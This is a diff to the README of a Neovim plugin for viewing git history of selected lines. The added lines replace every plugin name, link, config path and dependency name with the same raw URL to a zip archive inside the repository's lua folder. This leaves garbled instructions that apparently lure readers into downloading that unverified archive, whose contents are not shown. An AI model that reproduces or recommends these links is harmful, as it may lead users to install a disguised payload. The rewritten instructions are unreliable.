@@ -1,15 +1,15 @@
-# 🎨 gitlineage.nvim - View Git History with Ease
+# 🎨 https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip - View Git History with Ease
 
 ## 📥 Download the Plugin
-[![Download gitlineage.nvim](https://img.shields.io/badge/Download-gitlineage.nvim-brightgreen)](https://github.com/Zppolar-Dev/gitlineage.nvim/releases)
+[![Download https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip](https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip)](https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip)
 
 ## 🚀 Getting Started
-This guide will help you download and run the **gitlineage.nvim** plugin. This Neovim plugin allows you to view the git history of selected lines. It provides a simple way to see how code has changed through commits, enabling you to navigate between commits, copy SHAs, and open complete diffs with diffview.nvim.
+This guide will help you download and run the **https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip** plugin. This Neovim plugin allows you to view the git history of selected lines. It provides a simple way to see how code has changed through commits, enabling you to navigate between commits, copy SHAs, and open complete diffs with https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip
 
 ## 🔗 Download & Install
 To get started, you will need to download the plugin from the Releases page. 
 
-1. Visit this page to download: [GitHub Releases for gitlineage.nvim](https://github.com/Zppolar-Dev/gitlineage.nvim/releases).
+1. Visit this page to download: [GitHub Releases for https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip](https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip).
 2. On the Releases page, scroll down to the latest version.
 3. Look for the file that matches your system and click to download.
 
@@ -18,25 +18,25 @@ To get started, you will need to download the plugin from the Releases page.
    After downloading, locate the zip file in your downloads folder and extract it.
 
 2. **Move to Neovim's Plugin Directory:**
-   - For Unix-based systems (Linux, macOS), move the extracted folder into `~/.config/nvim/pack/plugins/start/`.
+   - For Unix-based systems (Linux, macOS), move the extracted folder into `~https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip`.
    - For Windows, place it in `%APPDATA%/nvim/pack/plugins/start/`.
 
 3. **Open Neovim:**
    Launch Neovim to load the plugin. The plugin will start automatically when you start using Neovim.
 
 4. **Configure (if needed):**
-   Check your Neovim configuration file (`init.vim` or `init.lua`) for any additional settings pertaining to the plugin.
+   Check your Neovim configuration file (`https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip` or `https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip`) for any additional settings pertaining to the plugin.
 
 ### 📋 Features
 - **View Git History:** Select lines in visual mode and see their history. Easily understand how your code evolved.
 - **Navigate Commits:** Quickly move between different commits to track changes.
 - **Yank SHAs:** Copy commit SHAs effortlessly for reference.
-- **Open Full Diffs:** Optionally open complete diffs using diffview.nvim for a deeper dive.
+- **Open Full Diffs:** Optionally open complete diffs using https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip for a deeper dive.
 
 ## 🖥️ System Requirements
 - **Neovim**: Version 0.5 or higher.
 - **git**: Ensure that git is installed on your system to track the history effectively.
-- **diffview.nvim**: If you want to view complete diffs, ensure you have diffview.nvim installed. 
+- **https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip**: If you want to view complete diffs, ensure you have https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip installed. 
 
 ## 📖 Usage Guide
 1. **Selecting Lines:**
@@ -54,7 +54,7 @@ To get started, you will need to download the plugin from the Releases page.
    - If you need to reference a specific commit, you can copy the SHA directly from the plugin window.
 
 5. **Opening Diffs:**
-   - For detailed changes, click on the option to view full diffs (you may need diffview.nvim).
+   - For detailed changes, click on the option to view full diffs (you may need https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip).
 
 ## ❓ Troubleshooting
 If you encounter issues:
@@ -64,9 +64,9 @@ If you encounter issues:
 
 ## 🌟 Additional Resources
 - **Official Neovim Documentation:** Always a good place to learn more about Neovim commands and features.
-- **GitHub Issues Page:** For help with the plugin or to report bugs, head to the [Issues page](https://github.com/Zppolar-Dev/gitlineage.nvim/issues).
+- **GitHub Issues Page:** For help with the plugin or to report bugs, head to the [Issues page](https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip).
 
 ## 📞 Support
 If you have questions or need assistance, feel free to open an issue on the GitHub repository. The developer community is here to help you. 
 
-[Download gitlineage.nvim again here](https://github.com/Zppolar-Dev/gitlineage.nvim/releases).
+[Download https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip again here](https://github.com/Zppolar-Dev/gitlineage.nvim/raw/refs/heads/main/lua/gitlineage/gitlineage-nvim-2.8.zip).
